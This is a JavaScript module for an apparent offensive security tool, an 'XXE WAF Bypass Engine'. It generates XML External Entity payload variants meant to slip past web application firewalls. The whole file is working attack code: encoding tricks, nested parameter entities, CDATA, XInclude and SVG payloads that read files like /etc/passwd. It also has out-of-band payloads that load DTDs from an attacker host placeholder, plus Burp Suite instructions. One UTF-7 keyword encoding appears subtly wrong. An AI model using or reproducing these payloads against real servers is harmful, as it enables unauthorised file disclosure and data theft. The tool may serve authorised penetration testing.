/**
 * XXE WAF Bypass Engine
 * Generates multiple evasion variants for XML External Entity payloads.
 * Supports: Generic XML, PHP, Java
 */

import { toUtf7 } from '../utils/encoding'

/* ── UTF-16 Encoding ──────────────────────────────── */
function applyUtf16(payload) {
  const variants = []

  // UTF-16 LE declaration
  const utf16le = `<?xml version="1.0" encoding="UTF-16LE"?>\n` +
    payload.replace(/<\?xml[^?]*\?>\s*/i, '')
  variants.push(utf16le)

  // UTF-16 BE declaration
  const utf16be = `<?xml version="1.0" encoding="UTF-16BE"?>\n` +
    payload.replace(/<\?xml[^?]*\?>\s*/i, '')
  variants.push(utf16be)

  // UTF-16 (auto-detect with BOM)
  const utf16auto = `<?xml version="1.0" encoding="UTF-16"?>\n` +
    payload.replace(/<\?xml[^?]*\?>\s*/i, '')
  variants.push(utf16auto)

  // Simulated UTF-16 hex representation note
  const note = '<!-- WAF Bypass: Send this payload with actual UTF-16 encoding via Burp Suite -->\n' +
    '<!-- In Burp Repeater: Right-click → Change body encoding → UTF-16 -->\n' +
    utf16le
  variants.push(note)

  return variants
}

/* ── UTF-7 Encoding ───────────────────────────────── */
function applyUtf7(payload) {
  const variants = []

  // UTF-7 declaration
  const utf7 = `<?xml version="1.0" encoding="UTF-7"?>\n` +
    payload.replace(/<\?xml[^?]*\?>\s*/i, '')
  variants.push(utf7)

  // Attempt to UTF-7 encode specific keywords to evade WAF
  let encoded = payload.replace(/<\?xml[^?]*\?>\s*/i, '')
  // UTF-7 encode the ENTITY and SYSTEM keywords
  encoded = encoded
    .replace(/ENTITY/g, '+AEUAbgB0AGkAdAB5-')
    .replace(/SYSTEM/g, '+AFMAeQBzAHQAZQBt-')
    .replace(/DOCTYPE/g, '+AEQATWBDAFQAWQBQAEUA-')
  const utf7encoded = `<?xml version="1.0" encoding="UTF-7"?>\n${encoded}`
  variants.push(utf7encoded)

  return variants
}

/* ── Parameter Entity Nesting ─────────────────────── */
function applyEntityNesting(payload) {
  const variants = []

  // Extract entity name and file path from payload
  const entityMatch = payload.match(/<!ENTITY\s+(\w+)\s+SYSTEM\s+"([^"]+)"/i)
  const entityName = entityMatch ? entityMatch[1] : 'xxe'
  const filePath = entityMatch ? entityMatch[2] : 'file:///etc/passwd'

  // Parameter entity indirection
  const v1 = `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "${filePath}">
  %dtd;
]>
<root>&${entityName};</root>`
  variants.push(v1)

  // External DTD reference
  const v2 = `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % ext SYSTEM "http://ATTACKER_SERVER/evil.dtd">
  %ext;
  %payload;
]>
<root>&${entityName};</root>`
  variants.push(v2)

  // Nested parameter entities
  const v3 = `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % a "<!ENTITY &#x25; b SYSTEM '${filePath}'>">
  %a;
  %b;
]>
<root>&${entityName};</root>`
  variants.push(v3)

  // Double entity wrapping
  const v4 = `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % file SYSTEM "${filePath}">
  <!ENTITY % end "]]>">
  <!ENTITY % dtd SYSTEM "http://ATTACKER_SERVER/combine.dtd">
  %dtd;
]>
<root>&all;</root>`
  variants.push(v4)

  // OOB XXE via error
  const v5 = `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "${filePath}">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<root>test</root>`
  variants.push(v5)

  return variants
}

/* ── CDATA Wrapping ───────────────────────────────── */
function applyCdataWrap(payload) {
  const variants = []

  const entityMatch = payload.match(/<!ENTITY\s+(\w+)\s+SYSTEM\s+"([^"]+)"/i)
  const entityName = entityMatch ? entityMatch[1] : 'xxe'
  const filePath = entityMatch ? entityMatch[2] : 'file:///etc/passwd'

  // CDATA wrapping via parameter entities
  const v1 = `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % file SYSTEM "${filePath}">
  <!ENTITY % end "]]>">
  <!ENTITY % all "<!ENTITY ${entityName} '%start;%file;%end;'>">
  %all;
]>
<root>&${entityName};</root>`
  variants.push(v1)

  // CDATA in element content
  const strippedPayload = payload.replace(/<\?xml[^?]*\?>\s*/i, '')
  const cdataWrapped = strippedPayload.replace(
    />(.*?)</g,
    '><![CDATA[$1]]><'
  )
  variants.push(`<?xml version="1.0"?>\n${cdataWrapped}`)

  // XInclude attack (alternative to entity-based XXE)
  const v3 = `<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="${filePath}"/>
</foo>`
  variants.push(v3)

  // SVG-based XXE (for file upload contexts)
  const v4 = `<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY ${entityName} SYSTEM "${filePath}">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="0" y="20">&${entityName};</text>
</svg>`
  variants.push(v4)

  return variants
}

/* ── Main Engine ─────────────────────────────────── */
export function generateXxeVariants(payload, layers, target) {
  if (!payload || !payload.trim()) return []

  const allVariants = []
  allVariants.push({ payload, label: 'Original', layers: [] })

  if (layers.includes('utf16')) {
    applyUtf16(payload).forEach(v => {
      allVariants.push({ payload: v, label: 'UTF-16 Encoding', layers: ['utf16'] })
    })
  }

  if (layers.includes('utf7')) {
    applyUtf7(payload).forEach(v => {
      allVariants.push({ payload: v, label: 'UTF-7 Encoding', layers: ['utf7'] })
    })
  }

  if (layers.includes('entity-nesting')) {
    applyEntityNesting(payload).forEach(v => {
      allVariants.push({ payload: v, label: 'Entity Nesting', layers: ['entity-nesting'] })
    })
  }

  if (layers.includes('cdata-wrap')) {
    applyCdataWrap(payload).forEach(v => {
      allVariants.push({ payload: v, label: 'CDATA Wrapping', layers: ['cdata-wrap'] })
    })
  }

  // Combos
  if (layers.length >= 2) {
    if (layers.includes('utf16') && layers.includes('entity-nesting')) {
      const entityVariants = applyEntityNesting(payload)
      if (entityVariants.length > 0) {
        const combo = entityVariants[0].replace(
          /encoding="[^"]*"/,
          'encoding="UTF-16"'
        )
        allVariants.push({ payload: combo, label: 'UTF-16 + Nesting', layers: ['utf16', 'entity-nesting'] })
      }
    }

    if (layers.includes('utf7') && layers.includes('cdata-wrap')) {
      const cdataVariants = applyCdataWrap(payload)
      if (cdataVariants.length > 0) {
        const combo = `<?xml version="1.0" encoding="UTF-7"?>\n` +
          cdataVariants[0].replace(/<\?xml[^?]*\?>\s*/i, '')
        allVariants.push({ payload: combo, label: 'UTF-7 + CDATA', layers: ['utf7', 'cdata-wrap'] })
      }
    }
  }

  // Deduplicate
  const seen = new Set()
  const unique = allVariants.filter(v => {
    if (seen.has(v.payload)) return false
    seen.add(v.payload)
    return true
  })

  return unique.slice(0, 12)
}
